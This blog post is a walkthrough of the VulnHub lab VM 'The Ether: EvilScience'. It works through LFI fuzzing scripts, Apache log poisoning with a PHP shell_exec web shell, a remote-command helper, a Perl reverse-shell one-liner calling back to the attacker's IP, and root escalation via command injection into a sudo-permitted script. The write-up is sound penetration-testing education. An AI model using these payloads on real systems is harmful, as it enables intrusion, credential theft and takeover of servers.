---
layout: post
last_modified_at: 2018-06-07 17:06:14 +0000
title: "The Ether: EvilScience Walkthrough"
category: Walkthrough
tags: [VulnHub, "The Ether"]
comments: true
image:
  feature: the-ether-evilscience-walkthrough.jpg
  credit: qimono / Pixabay
  creditlink: https://pixabay.com/en/dna-string-biology-3d-1811955/
---

This post documents the complete walkthrough of The Ether: EvilScience, a boot2root [VM][1] created by [f1re_w1re][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background
A mysterious company, _The Ether_ has proclaimed an elixir that considerably alters human welfare. The CDC has become suspicious of this group due to the nature of the product they are developing. The goal is to find out what _The Ether_ is up to.

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 12:09:bc:b1:5c:c9:bd:c3:ca:0f:b1:d5:c3:7d:98:1e (RSA)
|_  256 de:77:4d:81:a0:93:da:00:53:3d:4a:30:bd:7e:35:7d (ECDSA)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: The Ether
```

As usual, let's start with the web service. This is how the site looks like in my browser.

![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-1.png){: style="display: block"}
![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-3.png){: style="display: block"}

Let's use `curl` and some `grep`-fu to see if there are any hyperlinks that I can work with.

```
# curl -s 192.168.198.130 | grep -Eo '(src\=\".*\"|href\=\".*\")' | cut -d'"' -f2
http://www.os-templates.com/
layout/styles/layout.css
index.php
?file=about.php
?file=research.php
#
#
http://www.os-templates.com/
#top
layout/scripts/jquery.min.js
layout/scripts/jquery.backtotop.js
layout/scripts/jquery.mobilemenu.js
layout/scripts/jquery.flexslider-min.js
```

Among the hyperlinks, two of them stand out:

* `?file=about.php`
* `?file=research.php`

A hint of LFI vulnerability? Who knows?

### Directory/File Enumeration

Let's fuzz the site with `dirbuster` and see what we get.

![dirbuster](/assets/images/posts/evilscience-walkthrough/evilscience-2.png)

```
Dir found: / - 200
Dir found: /images/ - 200
Dir found: /layout/ - 200
Dir found: /layout/scripts/ - 200
Dir found: /icons/ - 403
Dir found: /server-status/ - 403
File found: /about.php - 200
File found: /index.php - 200
File found: /layout/scripts/jquery.backtotop.js - 200
File found: /layout/scripts/jquery.flexslider-min.js - 200
File found: /layout/scripts/jquery.min.js - 200
File found: /layout/scripts/jquery.mobilemenu.js - 200
File found: /research.php - 200
```

`dirbuster` finds the same two pages — `/about.php` and `/research.php`.

I notice the content of `/about.php` appears twice before the content of `/index.php` when I navigate to `/?file=about.php`.

OK. Now, I'm positive there is LFI vulnerability with the `file` parameter.

### Mapping of DocumentRoot

I try the following common LFI attacks with no success:

* `/etc/passwd`
* `/var/log/apache2/access.log`
* `/proc/self/environ`
* `php://filter`
* `php://include`

I have success displaying the content of `/usr/share/apache2/icons/README`.

![README](/assets/images/posts/evilscience-walkthrough/evilscience-5.png)

![README](/assets/images/posts/evilscience-walkthrough/evilscience-6.png)

The parameter allows absolute path in the URL but some kind of filtering for common LFI attacks is in place. The [**DocumentRoot**][4] is also not at the usual `/var/www/html`. :sweat:

Here's what I imagine the PHP code in `/index.php` to look like.

{% highlight php linenos %}
<?php
    $file = $_GET["file"];
    if (preg_match("/(etc|proc|var|php:)/", $file)) {
        include("/index.php");
    } else {
        include($file);
        include($file);
    }
?>
{% endhighlight %}

To that end, I wrote `fuzz.sh`, a `bash` script to map out the **DocumentRoot** by exploiting the `file` parameter, and fuzzing with the wordlists from [SecLists][5]. For this to work, a unique known string in the file must exists.

{% highlight bash linenos %}
# cat fuzz.sh
#!/bin/bash

HOST=192.168.198.130
PATTERN="$1"
KNOWN="$2"
WORDLIST="$3"

for word in $(cat "$WORDLIST"); do
    echo "[+] Trying ${PATTERN/FUZZ/$word}"
    if curl -s http://${HOST}/?file=${PATTERN/FUZZ/$word} \
       | grep -E "$KNOWN" &>/dev/null; then
        printf "\n"
        echo "[!] Found: http://${HOST}/?file=${PATTERN/FUZZ/$word}"
        break;
    fi
done
{% endhighlight %}

Now, let's give `fuzz.sh` a shot.

```
# ./fuzz.sh "../FUZZ/about.php" "About The Ether" /usr/share/seclists/Discovery/Web_Content/common.txt
...
[+] Trying ../pub/about.php
[+] Trying ../public/about.php
[+] Trying ../public_ftp/about.php
[+] Trying ../public_html/about.php

[!] Found: http://192.168.198.130/?file=../public_html/about.php
```

OK. The script is working — `/?file=../public_html/about.php` gives me the confidence.

![fuzz.sh](/assets/images/posts/evilscience-walkthrough/evilscience-4.png)

Moving up the next level got me stuck for hours. Not knowing how to move forward, I chance upon **theether.com** at the footer.

![theether.com](/assets/images/posts/evilscience-walkthrough/evilscience-7.png)

Using that as base, I created a custom wordlist with `python`.

{% highlight python linenos %}
# cat crunch.py
#!/usr/bin/env python

import itertools
import sys

s = sys.argv[1]

for word in map(''.join, itertools.product(*zip(s.lower(), s.upper()))):
    print word

# ./crunch.py theether.com > custom.txt
{% endhighlight %}

Using the custom wordlist with `fuzz.sh`, I'm able to map out the next level.

```
# ./fuzz.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt
...
[+] Trying ../../theeTHER.CoM/public_html/about.php
[+] Trying ../../theeTHER.COm/public_html/about.php
[+] Trying ../../theeTHER.COM/public_html/about.php
[+] Trying ../../theEther.com/public_html/about.php

[!] Found: http://192.168.198.130/?file=../../theEther.com/public_html/about.php
```

At long last. the **DocumentRoot** is at `/var/www/html/theEther.com/public_html`.

![docroot](/assets/images/posts/evilscience-walkthrough/evilscience-8.png)

Sweet.

### Access Log

Since I can't access the default `/var/log/apache2/access.log`, it's possible that the access log is elsewhere, perhaps even somewhere near.

Using `quickhits.txt` from SecLists with `fuzz.sh`, I'm able to map out this location.

```
# ./fuzz.sh "/var/www/html/theEther.comFUZZ" "^[0-9]" /usr/share/seclists/Discovery/Web_Content/quickhits.txt
...
[+] Trying /var/www/html/theEther.com/log.sqlite
[+] Trying /var/www/html/theEther.com/log.txt
[+] Trying /var/www/html/theEther.com/log/
[+] Trying /var/www/html/theEther.com/log/access.log

[!] Found: http://192.168.198.130/?file=/var/www/html/theEther.com/log/access.log
```

### LFI to Shell

Now that I've found `access.log`, I can corrupt it by sending PHP code through `netcat`.

```
# nc 192.168.198.130 80
<pre><?php echo shell_exec($_GET['cmd']);?></pre>
HTTP/1.1 400 Bad Request
Date: Thu, 08 Feb 2018 20:22:21 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 304
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at theEther.com Port 80</address>
</body></html>
```

With this in mind, I wrote another script to clean up the output from the remote command execution.

{% highlight bash linenos %}
# cat cmd.sh
#!/bin/bash

HOST=192.168.198.130
ACCESS=/var/www/html/theEther.com/log/access.log
CMD="$@"

function urlencode() {
    echo -n "$1" \
    | xxd -p \
    | sed -r 's/(..)/%\1/g'
}

while getopts ":e" opt; do
    case $opt in
        e)
            shift 1
            CMD=$(urlencode "$@")
            ;;
        \?)
            echo "Invalid option: -$OPTARG" >&2
            ;;
    esac
done

curl -s \
     "http://$HOST/?cmd=$CMD&file=$ACCESS" \
| sed -nr '/<pre>/,/<\/pre>/p;/<\/pre>/q' \
| sed -e 's/.*<pre>//g' -e 's/<\/pre>.*//g' \
| sed '$d'
{% endhighlight %}

Let's give it a shot.

```
# ./cmd.sh -e "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
...
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
evilscience:x:1000:1000:evilscience,,,:/home/evilscience:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
```

Not the PHP code I imagine but close.

{% highlight php linenos %}
# ./cmd.sh -e "cat index.php"
<?php
    $file = $_GET["file"];

    $file = str_ireplace("etc","",$file);
    $file = str_ireplace("php:","",$file);
    $file = str_ireplace("expect:","",$file);
    $file = str_ireplace("data:","",$file);
    $file = str_ireplace("proc","",$file);
    $file = str_ireplace("home","",$file);
    $file = str_ireplace("opt","",$file);

if ($file == "/var/log/auth.log") {
    header("location: index.php");
} else {
    include($file);
}
    include($file);
?>
{% endhighlight %}

Awesome. Now that I can execute remote commands, it's reverse shell time. I always like my reverse shell in Perl whenever it's available on the target system.

```perl
perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

To avoid complications, it's best to `urlencode()` the above and then spawn a pseudo-tty for optimal output control.

![shell](/assets/images/posts/evilscience-walkthrough/evilscience-9.png)

I have shell.

### Privilege Escalation

I notice that user `evilscience` is able to `sudo` as `root`.

![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-10.png)

There's also a file with the `setuid` and `setgid` bit turned on. Notice the file size on this guy? 11MB for a Python file? Something funky is going on here.

![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-11.png)

`www-data` has some pretty interesting permissions going on as well.

![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-12.png)

In any case, let's run `xxxlogauditorxxx.py` and see what I'm up against.

![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-13.png)

It appears to be displaying the content of the chosen log file.

_For `/var/log/auth.log`_

![auth.log](/assets/images/posts/evilscience-walkthrough/evilscience-15.png)

_For `/var/log/apache2/access.log`_

![access.log](/assets/images/posts/evilscience-walkthrough/evilscience-14.png)

It uses `cat` to display the content of the files. Recall from above that `www-data` is able to run `xxxlogauditorxxx.py` as `root` without password?

Armed with this new knowledge, let's see if we can display `/etc/shadow` along with `/var/log/auth.log`.

![shadow](/assets/images/posts/evilscience-walkthrough/evilscience-16.png)

Holy smoke. It works.

My guess is that the command goes something like this.

```bash
cat /var/log/auth.log /etc/shadow
```

Perhaps I can use command substitution with backticks to execute another command as `root`? First, let's generate a single-stage reverse shell with `msfvenom` and transfer it over.

![msfvenom](/assets/images/posts/evilscience-walkthrough/evilscience-17.png)

![nc](/assets/images/posts/evilscience-walkthrough/evilscience-18.png)

Time to test my hypothesis.

![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-21.png)

![root](/assets/images/posts/evilscience-walkthrough/evilscience-19.png)

:dancer:

### Getting to Bikini Bottom :bikini:

There's a PNG file `flag.png` in `/root` that looks like this.

![flag.png](/assets/images/posts/evilscience-walkthrough/flag.png)

A long `base64` encoded string appends to the end of the file.

![base64](/assets/images/posts/evilscience-walkthrough/evilscience-20.png)

The cat is now out of the bag.

```
# strings flag.png | sed '$!d' | sed 's/flag: //' | base64 -d
```
<pre class="wrap">
October 1, 2017.
We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!

October 3, 2017.
The first human test was conducted. Our surgeons have injected a female subject with the first strain of a benign virus. No reactions at this time from this patient.

October 3, 2017.
Something has gone wrong. After a few hours of injection, the human specimen appears symptomatic, exhibiting dementia, hallucinations, sweating, foaming of the mouth, and rapid growth of canine teeth and nails.

October 4, 2017.
Observing other candidates react to the injections. The ether seems to work for some but not for others. Keeping close observation on female specimen on October 3rd.

October 7, 2017.
The first flatline of the series occurred. The female subject passed. After decreasing, muscle contractions and life-like behaviors are still visible. This is impossible! Specimen has been moved to a containment quarantine for further evaluation.

October 8, 2017.
Other candidates are beginning to exhibit similar symptoms and patterns as female specimen. Planning to move them to quarantine as well.

October 10, 2017.
Isolated and exposed subject are dead, cold, moving, gnarling, and attracted to flesh and/or blood. Cannibalistic-like behaviour detected. An antidote/vaccine has been proposed.

October 11, 2017.
Hundreds of people have been burned and buried due to the side effects of the ether. The building will be burned along with the experiments conducted to cover up the story.

October 13, 2017.
We have decided to stop conducting these experiments due to the lack of antidote or ether. The main reason being the numerous death due to the subjects displaying extreme reactions the the engineered virus. No public announcement has been declared. The CDC has been suspicious of our testings and are considering martial laws in the event of an outbreak to the general population.

--Document scheduled to be shredded on October 15th after PSA.
</pre>

### Afterthought

Not for the faint of heart. :broken_heart:

[1]: https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/
[2]: https://securityshards.wordpress.com/
[3]: https://www.vulnhub.com/
[4]: https://httpd.apache.org/docs/2.4/mod/core.html#documentroot
[5]: https://github.com/danielmiessler/SecLists

*[LFI]: Local File Inclusion
